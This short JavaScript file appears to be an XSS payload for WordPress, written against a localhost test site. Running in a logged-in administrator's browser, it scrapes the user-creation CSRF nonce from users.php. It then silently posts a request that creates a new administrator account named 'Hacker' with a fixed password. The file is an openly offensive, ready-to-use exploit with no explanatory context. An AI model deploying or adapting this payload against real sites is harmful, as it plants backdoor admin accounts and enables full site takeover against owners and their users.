var target = 'http://localhost/xss';
var url, xhr, data, wpnonce, htmlDocument, parser;

//Get CSRF token
url = `${target}/wp-admin/users.php`;
wpnonce = '';
xhr = new XMLHttpRequest();
xhr.open("GET", url, false);
xhr.withCredentials = true;
xhr.onreadystatechange = function(){
    if (this.readyState == 4 && this.status == 200){
        parser = new DOMParser();
        htmlDocument = parser.parseFromString(this.responseText, "text/html");
        wpnonce = htmlDocument.getElementById("_wpnonce_create-user").value;
    }
};
xhr.send();

//AddAdmin
xhr = new XMLHttpRequest();
xhr.open("POST", url, true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;
data = `action=createuser&_wpnonce_create-user=${wpnonce}&_wp_http_referer=%2Fxss%2Fwp-admin%2Fuser-new.php&user_login=Hacker&email=Hacker%40email.com&first_name=Maroon&last_name=X&url=&pass1=12345678hacked&pass2=12345678hacked&pw_weak=on&send_user_notification=1&role=administrator&createuser=Add+New+User`;
xhr.send(data);